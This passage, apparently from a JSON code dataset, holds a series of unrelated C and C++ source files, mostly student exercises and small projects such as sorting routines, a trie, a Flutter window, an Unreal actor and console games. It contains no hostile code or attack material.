WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    Se",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\nvoid soru1() {\n    int sayilar[500];\n    int sayilar2[500];\n    int gecici, sayi;\n    srand(time(NULL));\n\n    for (int i = 0; i < 500; i++) {\n        sayi = rand() % 1000 + 1;\n        sayilar[i] = sayi;\n        sayilar2[i] = sayi;\n    }\n\n    for (int i = 0; i < 500; i++) {\n        printf(\"%d \", sayilar[i]);\n    }\n\n    printf(\"\\n------------------------------------------------------------\\n\"); // Selection Sort\n\n    clock_t baslangic, bitis;\n    double gecen_sure;\n\n    baslangic = clock();\n    for (int i = 0; i < 499; i++) {\n        for (int j = i + 1; j < 500; j++) {\n            if (sayilar[j] < sayilar[i]) {\n                gecici = sayilar[i];\n                sayilar[i] = sayilar[j];\n                sayilar[j] = gecici;\n            }\n        }\n    }\n\n    for (int i = 0; i < 500; i++) {\n        printf(\"Selection Sort ile siralanmis dizi elemanlari = %d\\n\", sayilar[i]);\n    }\n    bitis = clock();\n    gecen_sure = ((double)(bitis - baslangic)) / CLOCKS_PER_SEC;\n    printf(\"Selection sort islemi %.2f saniye surdu.\\n\", gecen_sure);\n\n    printf(\"------------------------------------------------------------\\n\"); // Insertion Sort\n\n    baslangic = clock();\n    for (int i = 1; i < 500; i++) {\n        gecici = sayilar2[i];\n        int j = i - 1;\n        while (j >= 0 && sayilar2[j] > gecici) {\n            sayilar2[j + 1] = sayilar2[j];\n            j--;\n        }\n        sayilar2[j + 1] = gecici;\n    }\n\n    for (int i = 0; i < 500; i++) {\n        printf(\"Insertion Sort ile siralanmis dizi elemanlari = %d\\n\", sayilar2[i]);\n    }\n    bitis = clock();\n    gecen_sure = ((double)(bitis - baslangic)) / CLOCKS_PER_SEC;\n    printf(\"Insertion sort islemi %.2f saniye surdu.\\n\", gecen_sure);\n\n\n}\n\n\nvoid soru2() {\n    int gecici, sayac = 0;\n    int sayilar[10] = { 13, 214, 56, 627, 123, 10, 190, 20, 32, 14 };\n    int bk[10];\n\n    // Insertion Sort\n    for (int i = 0; i < 10; i++) {\n        gecici = sayilar[i];\n        int j = i - 1;\n        while (j > -1 && sayilar[j] > gecici) {\n            sayilar[j + 1] = sayilar[j];\n            j--;\n        }\n        sayilar[j + 1] = gecici;\n    }\n\n    // Diziyi tersine \u00e7evir ve bk dizisine ata\n    for (int t = 9; t >= 0; t--) {\n        bk[sayac] = sayilar[t];\n        sayac++;\n    }\n\n    // \u00ddlk be\u00fe eleman\u00fd yazd\u00fdr\n    for (int i = 0; i < 5; i++) {\n        printf(\"%d \", bk[i]);\n        printf(\"%d \", sayilar[i]);\n    }\n\n\n}\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n#include <string.h>\n\n#define ALPHABET_SIZE 26\n\n// Trie d\u00fc\u00f0\u00fcm yap\u00fds\u00fd\ntypedef struct TrieNode {\n    struct TrieNode* children[ALPHABET_SIZE];\n    bool isEndOfWord; // Bu d\u00fc\u00f0\u00fcm bir kelimenin sonunu g\u00f6sterir\n} TrieNode;\n\n// Yeni bir Trie d\u00fc\u00f0\u00fcm\u00fc olu\u00fetur\nTrieNode* createNode() {\n    TrieNode* node = (TrieNode*)malloc(sizeof(TrieNode));\n    node->isEndOfWord = false;\n    for (int i = 0; i < ALPHABET_SIZE; i++) {\n        node->children[i] = NULL;\n    }\n    return node;\n}\n\n// Ekleme \u00dd\u00felemi\nvoid insert(TrieNode* root, const char* key) {\n    TrieNode* crawler = root;\n    while (*key) {\n        int index = *key - 'a';\n        if (crawler->children[index] == NULL) {\n            crawler->children[index] = createNode();\n        }\n        crawler = crawler->children[index];\n        key++;\n    }\n    crawler->isEndOfWord = true;\n}\n\n// Arama \u00dd\u00felemi\nbool search(TrieNode* root, const char* key) {\n    TrieNode* crawler = root;\n    while (*key) {\n        int index = *key - 'a';\n        if (crawler->children[index] == NULL) {\n            return false;\n        }\n        crawler = crawler->children[index];\n        key++;\n    }\n    return crawler != NULL && crawler->isEndOfWord;\n}\n\n// Bo\u00fe olup olmad\u00fd\u00f0\u00fdn\u00fd kontrol et\nbool isEmpty(TrieNode* root) {\n    for (int i = 0; i < ALPHABET_SIZE; i++) {\n        if (root->children[i] != NULL) {\n            return false;\n        }\n    }\n    return true;\n}\n\n// Silme \u00dd\u00felemi (Rek\u00fcrsif)\nTrieNode* Delete(TrieNode* root, const char* key, int depth) {\n    if (!root) {\n        return NULL;\n    }\n\n    if (depth == strlen(key)) {\n        if (root->isEndOfWord) {\n            root->isEndOfWord = false;\n        }\n        if (isEmpty(root)) {\n            free(root);\n            root = NULL;\n        }\n        return root;\n    }\n\n    int index = key[depth] - 'a';\n    root->children[index] = Delete(root->children[index], key, depth + 1);\n\n    if (isEmpty(root) && !root->isEndOfWord) {\n        free(root);\n        root = NULL;\n    }\n\n    return root;\n}\n\n// Kullan\u00fdm \u00d6rne\u00f0i\nvoid soru3() {\n    char keys[][8] = { \"the\", \"a\", \"there\", \"answer\", \"any\", \"by\", \"bye\", \"their\" };\n    int n = sizeof(keys) / sizeof(keys[0]);\n\n    TrieNode* root = createNode();\n\n    // Kelimeleri ekle\n    for (int i = 0; i < n; i++) {\n        insert(root, keys[i]);\n    }\n\n    // Kelimeleri ara\n    search(root, \"the\") ? printf(\"the -- found\\n\") : printf(\"the -- not found\\n\");\n    search(root, \"these\") ? printf(\"these -- found\\n\") : printf(\"these -- not found\\n\");\n\n    // Kelime sil\n    root = Delete(r",
    "#include <iostream>\nusing namespace std;\n\nenum Months {\n    January = 1,\n    February,\n    March,\n    April,\n    May,\n    June,\n    July,\n    August,\n    September,\n    October,\n    November,\n    December\n};\n\nint main() {\n    int monthNumber;\n    while (true) {\n        cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u043c\u0435\u0441\u044f\u0446\u0430: \";\n        cin >> monthNumber;\n        \n        if (monthNumber == 0) {\n            cout << \"\u0414\u043e \u0441\u0432\u0438\u0434\u0430\u043d\u0438\u044f\" << endl;\n            break;\n        }\n\n        switch (monthNumber) {\n            case January:\n                cout << \"\u042f\u043d\u0432\u0430\u0440\u044c\" << endl;\n                break;\n            case February:\n                cout << \"\u0424\u0435\u0432\u0440\u0430\u043b\u044c\" << endl;\n                break;\n            case March:\n                cout << \"\u041c\u0430\u0440\u0442\" << endl;\n                break;\n            case April:\n                cout << \"\u0410\u043f\u0440\u0435\u043b\u044c\" << endl;\n                break;\n            case May:\n                cout << \"\u041c\u0430\u0439\" << endl;\n                break;\n            case June:\n                cout << \"\u0418\u044e\u043d\u044c\" << endl;\n                break;\n            case July:\n                cout << \"\u0418\u044e\u043b\u044c\" << endl;\n                break;\n            case August:\n                cout << \"\u0410\u0432\u0433\u0443\u0441\u0442\" << endl;\n                break;\n            case September:\n                cout << \"\u0421\u0435\u043d\u0442\u044f\u0431\u0440\u044c\" << endl;\n                break;\n            case October:\n                cout << \"\u041e\u043a\u0442\u044f\u0431\u0440\u044c\" << endl;\n                break;\n            case November:\n                cout << \"\u041d\u043e\u044f\u0431\u0440\u044c\" << endl;\n                break;\n            case December:\n                cout << \"\u0414\u0435\u043a\u0430\u0431\u0440\u044c\" << endl;\n                break;\n            default:\n                cout << \"\u041d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043d\u043e\u043c\u0435\u0440!\" << endl;\n        }\n    }\n\n    return 0;\n}",
    "#include <iostream>\n#include <vector>\nusing namespace std;\n\nvoid printArray(int arr[], int size)\n{\n    for (int i = 0; i < size; i++)\n    {\n        cout << \"Element at index \" << i << \" is \" << arr[i] << endl;\n    }\n}\nvector<int> getArray()\n{\n    vector<int> a = {1, 2, 3, 4, 5};\n    return a;\n}\n\nint main()\n{\n\n    // Array declaration ------------\n    // int arr[5] = {1, 2, 3, 4, 5};\n\n    // Accessing array elements ------------\n    // cout << \"First element: \" << arr[0] << endl;\n\n    // Changing array elements ------------\n    // arr[0] = 10;\n    // cout << \"First element after change: \" << arr[0] << endl;\n\n    // Iterating over array ------------\n\n    // for (int i = 0; i < 5; i++)\n    // {\n    //     cout << \"Element at index \" << i << \" is \" << arr[i] << endl;\n    // }\n\n    // pass array to function ------------\n\n    // printArray(arr, 5);\n\n    // Return Array from function ------------\n\n    // The best way to return an array from a function in C++ is to use a container like std::vector or std::array.\n    // These containers manage memory automatically and are safer to use than raw arrays.\n\n    // vector<int> arr2 = getArray();\n    // for (int i = 0; i < arr2.size(); i++)\n    // {\n    //     cout << \"Element at index \" << i << \" is \" << arr2[i] << endl;\n    // }\n\n    return 0;\n}",
    "\ufeff#include <iostream>\n#include <stdexcept>\n#include <Windows.h>\n\ntemplate <typename T>\nclass SimpleVector {\nprivate:\n    T* data;          // \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u0434\u0430\u043d\u043d\u044b\u0435\n    int currentSize;  // \u0442\u0435\u043a\u0443\u0449\u0438\u0439 \u0440\u0430\u0437\u043c\u0435\u0440\n    int currentCapacity;  // \u0442\u0435\u043a\u0443\u0449\u0430\u044f \u0432\u043c\u0435\u0441\u0442\u0438\u043c\u043e\u0441\u0442\u044c\n\n    void resize(int newCapacity) {\n        T* newData = new T[newCapacity];\n        for (int i = 0; i < currentSize; ++i) {\n            newData[i] = data[i];\n        }\n        delete[] data;\n        data = newData;\n        currentCapacity = newCapacity;\n    }\n\npublic:\n    SimpleVector() : data(nullptr), currentSize(0), currentCapacity(0) {}\n\n    ~SimpleVector() {\n        delete[] data;\n    }\n\n    void push_back(const T& value) {\n        if (currentSize == currentCapacity) {\n            int newCapacity = currentCapacity == 0 ? 1 : currentCapacity * 2;\n            resize(newCapacity);\n        }\n        data[currentSize++] = value;\n    }\n\n    T& at(int index) {\n        if (index < 0 || index >= currentSize) {\n            throw std::out_of_range(\"\u0412\u043d\u0435 \u0434\u0438\u0430\u043f\u0430\u0437\u043e\u043d\u0430\");\n        }\n        return data[index];\n    }\n\n    int size() const {\n        return currentSize;\n    }\n\n    int capacity() const {\n        return currentCapacity;\n    }\n};\n\n// \u041f\u0440\u0438\u043c\u0435\u0440 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u044f SimpleVector\nint main() {\n\n    setlocale(LC_ALL, \"RU\");\n    SimpleVector<int> vec;\n    vec.push_back(1);\n    vec.push_back(2);\n    vec.push_back(3);\n\n    std::cout << \"\u042d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u0432 \u0432\u0435\u043a\u0442\u043e\u0440\u0435: \";\n    for (int i = 0; i < vec.size(); ++i) {\n        std::cout << vec.at(i) << \" \";\n    }\n    std::cout << std::endl;\n\n    std::cout << \"\u0420\u0430\u0437\u043c\u0435\u0440: \" << vec.size() << std::endl;\n    std::cout << \"\u0412\u043c\u0435\u0441\u0442\u0438\u043c\u043e\u0441\u0442\u044c: \" << vec.capacity() << std::endl;\n\n    return 0;\n}\n",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"MyActor.h\"\n\n// Sets default values\nAMyActor::AMyActor()\n{\n \t// Set this actor to call Tick() every frame.  You can turn this off to improve performance if you don't need it.\n\tPrimaryActorTick.bCanEverTick = true;\n\n}\n\n// Called when the game starts or when spawned\nvoid AMyActor::BeginPlay()\n{\n\tSuper::BeginPlay();\n\tStartLocation = GetActorLocation();\n\t\n}\n\n// Called every frame\nvoid AMyActor::Tick(float DeltaTime)\n{\n\tSuper::Tick(DeltaTime);\n\tToFroMotion(DeltaTime);\n\tRotator(DeltaTime);\n}\nvoid AMyActor:: Rotator(float DeltaTime)\n{\n\tFRotator CurrentRotation = GetActorRotation();\n\t CurrentRotation +=RotationSpeed*DeltaTime;\n\t SetActorRotation(CurrentRotation);\n\t if(!FullRotation){\n\t\tif(CurrentRotation.Euler().Z-StartRotation.Euler().Z>MaxRotation||CurrentRotation.Euler().Z-StartRotation.Euler().Z<-MaxRotation){\n\t\t\tRotationSpeed = FRotator(0,-RotationSpeed.Euler().Z,0);\n\n\t\t}\n\t }\n\n}\n\nvoid AMyActor:: ToFroMotion(float DeltaTime)\n{\n\tFVector CurrentLocation;\n\tCurrentLocation = GetActorLocation();\n\tCurrentLocation += MovementSpeed*DeltaTime;\n\tSetActorLocation(CurrentLocation);\n\tif(DestinationReached(CurrentLocation)){\n\t\tFVector MoveDirection = MovementSpeed.GetSafeNormal();\n\t\tStartLocation += MoveDistance*MoveDirection;\n\t\tfloat offset = FVector::Dist(StartLocation,GetActorLocation());\n\t\tSetActorLocation(StartLocation);\n\t\tFString s = GetActorNameOrLabel();\n\t\tUE_LOG(LogTemp,Error,TEXT(\"jbuj %s\"),*s);\n\t\tMovementSpeed = -MovementSpeed;\n\t}\n\tAddActorLocalRotation(RotationSpeed*DeltaTime);\n\n\n}\n\nbool AMyActor:: DestinationReached(FVector CurrentLocation) const\n{\n\tfloat DistanceMoved = FVector::Dist(StartLocation,CurrentLocation);\n\treturn DistanceMoved >= MoveDistance;\n}\n\n",
    "#include \"Form.hpp\"\n\nForm::Form()\n    : _name(\"default\"), _isSigned(false), _grade2Sign(150), _grade2Exec(150) {\n}\n\nForm::Form(const std::string& name, int gradeToSign, int gradeToExecute) \n    : _name(name), _isSigned(false), _grade2Sign(gradeToSign), _grade2Exec(gradeToExecute) {\n    if (gradeToSign < 1 || gradeToExecute < 1)\n        throw GradeTooHighException();\n    if (gradeToSign > 150 || gradeToExecute > 150)\n        throw GradeTooLowException();\n}\n\n\nForm::Form(const Form &other)\n    : _name(other._name), _isSigned(other._isSigned), _grade2Sign(other._grade2Sign), _grade2Exec(other._grade2Exec) {}\n\nForm &Form::operator=(const Form &other) {\n    if (this != &other) {\n        this->_isSigned = other._isSigned;\n    }\n    return *this;\n}\n\nForm::~Form() {}\n\nstd::string Form::getName() const {\n    return _name;\n}\n\nbool Form::getSigned() const {\n    return _isSigned;\n}\n\nint Form::getGrade2Sign () const {\n    return _grade2Sign;\n}\n\nint Form::getGrade2Execute() const {\n    return _grade2Exec;\n}\n\nvoid Form::beSigned(const Bureaucrat &bureaucrat) {\n    if (bureaucrat.getGrade() > _grade2Sign)\n        throw GradeTooLowException();\n    _isSigned = true;\n}\n\nstd::ostream &operator<<(std::ostream &os, const Form &form) {\n    os << form.getName() << \", form status: \" << (form.getSigned() ? \"signed\" : \"not signed\")\n    << \", grade required to sign: \" << form.getGrade2Sign()\n    << \", grade required to execute: \" << form.getGrade2Execute();\n    return os;\n}\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"test_state\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"XmlService.h\"\n\nWeather XmlService::getWeather(std::string s)\n{\n    xml_document doc;\n    xml_parse_result result = doc.load_file(s.c_str());\n    if (!result)\n        throw std::exception(\"error\");\n    xml_node node = doc.child(\"current\");\n    std::string city = node.child(\"city\").\n        attribute(\"name\").\n        as_string();\n    double lon = node.child(\"city\").child(\"coord\").\n        attribute(\"lon\").\n        as_double(); // 49.6601\n    double lat = node.child(\"city\").child(\"coord\").\n        attribute(\"lat\").\n        as_double(); // 58.5966\n    double temperature = node.child(\"temperature\").\n        attribute(\"value\").\n        as_double(); // 5.69\n    std::string weather = node.child(\"weather\").\n        attribute(\"value\").\n        as_string();\n    double windSpeed = node.child(\"wind\").\n        child(\"speed\").\n        attribute(\"value\").\n        as_double(); // 4.27\n    int clouds = node.child(\"clouds\").\n        attribute(\"value\").\n        as_int(); // 100\n    return Weather(city, lon, lat, temperature, weather, windSpeed, clouds);\n}\n",
    "#include <graphics.h>\r\n#include <iostream>\r\n#include <stdlib.h>\r\n#include <time.h>\r\nusing namespace std;\r\n\r\nconst int windowWidth = 800;\r\nconst int windowHeight = 600;\r\nconst int roadWidth = 200;\r\nconst int roadHeight = 600;\r\nint roadSpeed = 5;\r\n\r\nvoid moveCarLeft(int& x) {\r\n    x -= 5;\r\n    if (x < 0) {\r\n        x = 0;\r\n    }\r\n}\r\nvoid moveCarRight(int& x) {\r\n    x += 5;\r\n    if (x > windowWidth - 50) {\r\n        x = windowWidth - 50;\r\n    }\r\n}\r\n\r\nvoid drawCar(int x, int y) {\r\n    setcolor(WHITE);\r\n    rectangle(x, y, x + 50, y + 80);\r\n    setfillstyle(SOLID_FILL, RED);\r\n    floodfill(x + 25, y + 40, WHITE);\r\n\r\n    setcolor(WHITE);\r\n    rectangle(x, y + 5, x - 7, y + 25);\r\n    setfillstyle(SOLID_FILL, BLACK);\r\n    floodfill(x - 3, y + 15, WHITE);\r\n\r\n    setcolor(WHITE);\r\n    rectangle(x + 50, y + 5, x + 57, y + 25);\r\n    setfillstyle(SOLID_FILL, BLACK);\r\n    floodfill(x - 3, y + 15, WHITE);\r\n\r\n    setcolor(WHITE);\r\n    rectangle(x + 50, y + 55, x + 57, y + 75);\r\n    setfillstyle(SOLID_FILL, BLACK);\r\n    floodfill(x - 3, y + 15, WHITE);\r\n\r\n    setcolor(WHITE);\r\n    rectangle(x, y + 55, x - 7, y + 75);\r\n    setfillstyle(SOLID_FILL, BLACK);\r\n    floodfill(x - 3, y + 15, WHITE);\r\n}\r\n\r\nvoid drawBackground(int roadY) {\r\n    setfillstyle(WIDE_DOT_FILL, GREEN);  // \u00f2\u00f0\u00e0\u00e2\u00e0\r\n    bar(0, 0, (windowWidth - roadWidth) / 2, windowHeight);\r\n    bar((windowWidth + roadWidth) / 2, 0, windowWidth, windowHeight); \r\n\r\n    setfillstyle(SOLID_FILL, RGB(128, 128, 128));  //\u00e4\u00ee\u00f0\u00ee\u00e3\u00e0\r\n\r\n    int numStripes = (windowHeight / 60) + 2;\r\n    int startY = roadY % 60;\r\n    for (int i = 0; i < numStripes; i++) {\r\n        int y = startY + (i * 60);\r\n        bar((windowWidth - roadWidth) / 2 + roadWidth / 2 - 10, y, \\\r\n       (windowWidth - roadWidth) / 2 + roadWidth / 2 + 10, y + 30);\r\n    }\r\n}\r\n\r\nint main() {\r\n    initwindow(windowWidth, windowHeight, \"Racing Game\", true);  \r\n    setbkcolor(BLACK);\r\n\r\n    settextstyle(DEFAULT_FONT, HORIZ_DIR, 4);\r\n    outtextxy(windowWidth / 2 - 240, windowHeight / 4, \\\r\n   \"I Need To Stop \");\r\n    settextstyle(DEFAULT_FONT, HORIZ_DIR, 4);\r\n    outtextxy(windowWidth / 2 - 300, windowHeight / 4 + 50, \\\r\n   \"But I Have No Breaks\");\r\n\r\n    // start\r\n    settextstyle(DEFAULT_FONT, HORIZ_DIR, 3);\r\n    int buttonX = windowWidth / 2 - 60;\r\n    int buttonY = windowHeight / 2;\r\n    int buttonWidth = 100;\r\n    int buttonHeight = 50;\r\n    rectangle(buttonX, buttonY, buttonX + buttonWidth + 40, \\\r\n   buttonY + buttonHeight);\r\n    outtextxy(buttonX + 10, buttonY + 10, \"START\");\r\n\r\n    //\u00f1\u00eb\u00ee\u00e6\u00ed\r\n    settextstyle(DEFAULT_FONT, HORIZ_DIR, 2);\r\n    int easyButtonX = windowWidth / 2 - 170;\r\n    int easyButtonY = windowHeight / 2 + 80;\r\n    int easyButtonWidth = 87;\r\n    int easyButtonHeight = 50;\r\n    rectangle(easyButtonX, easyButtonY, \\\r\n    easyButtonX + easyButtonWidth, easyButtonY + easyButtonHeight);\r\n    outtextxy(easyButtonX + 10, easyButtonY + 10, \"EASY\");\r\n\r\n    int mediumButtonX = windowWidth / 2 - 50;\r\n    int mediumButtonY = windowHeight / 2 + 80;\r\n    int mediumButtonWidth = 120;\r\n    int mediumButtonHeight = 50;\r\n    rectangle(mediumButtonX, mediumButtonY, \\\r\n    mediumButtonX + mediumButtonWidth, \\\r\n    mediumButtonY + mediumButtonHeight);\r\n    \r\n    outtextxy(mediumButtonX + 10, mediumButtonY + 10, \"MEDIUM\");\r\n\r\n    int hardButtonX = windowWidth / 2 + 100;\r\n    int hardButtonY = windowHeight / 2 + 80;\r\n    int hardButtonWidth = 87;\r\n    int hardButtonHeight = 50;\r\n    rectangle(hardButtonX, hardButtonY, hardButtonX + hardButtonWidth, \\\r\n    hardButtonY + hardButtonHeight);\r\n    outtextxy(hardButtonX + 10, hardButtonY + 10, \"HARD\");\r\n\r\n    // \u00ee\u00e6\u00e8\u00e4 \u00ea\u00eb\u00e8\u00ea\r\n    int mouseX, mouseY;\r\n    int selectedButton = -1;\r\n    int difficulty = 1;\r\n    while (1) {\r\n        delay(100);\r\n        if (ismouseclick(WM_LBUTTONDOWN)) {\r\n            mouseX = mousex();\r\n            mouseY = mousey();\r\n            if (mouseX >= buttonX && mouseX <= buttonX + buttonWidth\\\r\n               && mouseY >= buttonY && mouseY <= buttonY + buttonHeight) {\r\n                if (selectedButton != -1) {\r\n                    break;\r\n                }\r\n            }\r\n            if (mouseX >= easyButtonX && mouseX <= easyButtonX + \\\r\n               easyButtonWidth && mouseY >= easyButtonY && mouseY \\\r\n            <= easyButtonY + easyButtonHeight) {\r\n               \r\n                selectedButton = 1;\r\n                difficulty = 1;\r\n            }\r\n            if (mouseX >= mediumButtonX && mouseX <= mediumButtonX + \\\r\n               mediumButtonWidth && mouseY >= mediumButtonY && mouseY <= \\\r\n            mediumButtonY + mediumButtonHeight) {\r\n               \r\n                selectedButton = 2;\r\n                difficulty = 2;\r\n            }\r\n            if (mouseX >= hardButtonX && mouseX <= hardButtonX + \\\r\n               hardButtonWidth && mouseY >= hardButtonY && mouseY <= \\\r\n            hardButtonY + hardButtonHeight) {\r\n               \r\n                selectedButton = 3;\r\n                difficulty = 3;\r\n            }\r\n        }\r\n        \r\n      ",
    "#include \"Graph.h\"\n#include \"Party.h\"\n\nGraph::Graph(vector<Party> vertices, vector<vector<int>> edges) : mVertices(vertices), mEdges(edges) \n{\n    // You can change the implementation of the constructor, but not the signature!\n}\n\nGraph::Graph(const Graph &other) : mVertices(other.mVertices), mEdges(other.mEdges) \n{\n    // You can change the implementation of the constructor, but not the signature!\n}\n\nint Graph::getMandates(int partyId) const\n{\n    return mVertices[partyId].getMandates();\n}\n\nvector<Party> Graph::getmVertices() const{return mVertices;}\n\nstd::vector<std::pair<int, int>> Graph::getNeighbors(Party curr)\n{\n    std::vector<std::pair<int, int>> a;\n    for( Party &ver : mVertices)\n    {\n        if (ver.getmId() != curr.getmId())\n        {\n            int edgeWeight = getEdgeWeight(curr.getmId(),ver.getmId());\n            if (edgeWeight>0)\n            {\n                a.push_back(std::pair<int, int>(edgeWeight,ver.getmId()));\n            }\n            \n        }\n        \n    }\n    return a;\n}\n\nint Graph::getEdgeWeight(int v1, int v2) const\n{\n    return mEdges[v1][v2];\n}\n\n\nint Graph::getNumVertices() const\n{\n    return mVertices.size();\n}\n\nconst Party &Graph::getParty(int partyId) const\n{\n    return mVertices[partyId];\n}\nParty &Graph::getParty2(int partyId) \n{\n    return mVertices[partyId];\n}\n",
    "#include <iostream>\r\n#include \"clui.h\"\r\n#include <chrono>\r\nusing namespace std;\r\nusing namespace chrono;\r\n\r\nbool at_beginning_game, gameover, at_start, draw, timer, time_has_passed;\r\nint menu, speed;\r\nsteady_clock::time_point start_time;\r\nsteady_clock::time_point end_time;\r\n\r\nstruct info{\r\n    char name[50];\r\n    int score;\r\n}players[50], current_players[2], winner;\r\nchar input_name[50];\r\n\r\nenum direciton{\r\n    STOP, LEFT, RIGHT, UP, DOWN\r\n}current_dir1, current_dir2;\r\n\r\nconst int width = 50;\r\nconst int height = 15;\r\n\r\nint number_of_players;\r\nint x1, y_1, x2, y2;\r\nint savex1, savex2, savey1, savey2;\r\nint fruit_x,fruit_y, bomb_x, bomb_y, profruit_x, profruit_y;\r\nint tail_x1[600], tail_y1[600], tail_x2[600], tail_y2[600];\r\nint tail_size1, tail_size2;\r\n\r\nvoid swap(info& player1, info& player2){\r\n    info temp = player1;\r\n    player1 = player2;\r\n    player2 = temp;\r\n}\r\n\r\nint number_length(int number){\r\n    int result=0;\r\n    if(number == 0)\r\n    return 1;\r\n    for(int i = 0 ; number > 0 ; i++){\r\n        if(number > 0 && number < 10){\r\n            result++;\r\n            return result;\r\n        }\r\n        else{\r\n            result++;\r\n            number /= 10;\r\n        }\r\n    }\r\n    return result;\r\n}\r\n\r\nvoid welcome(){\r\n     int cols =  get_window_cols();\r\n     int rows = get_window_rows();\r\n     int middle = cols / 2;\r\n    cursor_to_pos(0, 12);\r\n    change_color_rgb(72, 58, 194);\r\n    change_color_rgb(58, 40, 222);\r\n    std::cout << \"Hi!\" << std:: endl;\r\n    // cursor_to_pos(0, middle-10);\r\n    // cursor_down(1);\r\n    // save_cursor();\r\n    change_color_rgb(72, 58, 194);\r\n    change_color_rgb(58, 40, 222);\r\n    std::cout << \"Welcome to the \";\r\n    change_color_rgb(46, 153, 135);\r\n    //cursor_forward(16);\r\n    //save_cursor();\r\n    std:: cout << \"SNAKE \" ;\r\n    change_color_rgb(72, 58, 194);\r\n    change_color_rgb(58, 40, 222);\r\n    //cursor_forward(6);\r\n    std:: cout << \"game!\" << std:: endl << endl;\r\n    reset_color();\r\n}\r\n\r\nvoid list(){\r\n    change_color_rgb(35, 98, 186);\r\n    change_color_rgb(51, 148, 204);\r\n    std::cout << \"Please choose one of the following options:\" << endl;\r\n    std::cout << \"1)Start\" << endl;\r\n    std::cout << \"2)Score's list\" << endl;\r\n    std::cout << \"3)Enter username and change the player\" << endl;\r\n    std::cout << \"4)Exit\" << endl << endl;\r\n    delay(1000);\r\n    change_color_rgb(33, 169, 184);\r\n    std::cout << \"Enter the number of the chosen option: \";\r\n    std::cin >> menu;\r\n\r\n    if(menu == 4)\r\n    quit();\r\n}\r\n\r\nvoid first_list_error(){\r\n    //clear_screen();\r\n    system(\"cls\");\r\n    if(at_beginning_game && menu==1){\r\n            change_color_rgb(240, 26, 62);\r\n            cout << \"Sorry you haven't entered the players' names yet, first enter your name.\" << endl;\r\n            list();\r\n            if(menu == 3)\r\n            at_beginning_game = false;\r\n        }\r\n        else if(at_beginning_game && menu==2){\r\n            change_color_rgb(240, 26, 62);\r\n            cout << \"Sorry you haven't played yet! Please enter a valid option.\" << endl;\r\n            list();\r\n            if(menu == 3)\r\n            at_beginning_game = false;\r\n        }\r\n        else if(menu<1 || menu > 4){\r\n            change_color_rgb(240, 26, 62);\r\n            cout << \"Please enter a valid option!\" << endl;\r\n            list();\r\n        }\r\n}\r\n\r\nbool check_names_eqaul(char* first, char* second){\r\n    if(strlen(first) != strlen(second))\r\n    return false;\r\n\r\n    for(int i=0 ; i<strlen(first) ; i++){\r\n        if(first[i] != second[i])\r\n        return false;\r\n    }\r\n    \r\n    return true;\r\n}\r\n\r\nint is_name_standard(char* str, int which_player){\r\n    if(strlen(str) >= 31)\r\n    return 2;\r\n    \r\n    if(which_player!=1){\r\n        if(check_names_eqaul(str, current_players[0].name))\r\n        return 3;\r\n    }\r\n\r\n    for(int i=0 ; i<number_of_players ; i++){\r\n        if(check_names_eqaul(str, players[i].name))\r\n        return 4;\r\n    }\r\n\r\n    return 1;\r\n}\r\n\r\nvoid get_information(){\r\n    int check_repeat = -1;\r\n\r\n    change_color_rgb(135, 28, 76);\r\n    std:: cout << \"I will ask you to choose which player do you want to be\" << endl;\r\n    std:: cout << \"The \";\r\n    change_color_rgb(79, 191, 227);\r\n    std:: cout << \"first player \";\r\n    change_color_rgb(135, 28, 76);\r\n    std:: cout << \"will play with w, a, s and d keys.\" << endl;\r\n    std:: cout << \"The \";\r\n    change_color_rgb(71, 71, 186);\r\n    std:: cout << \"second player \";\r\n    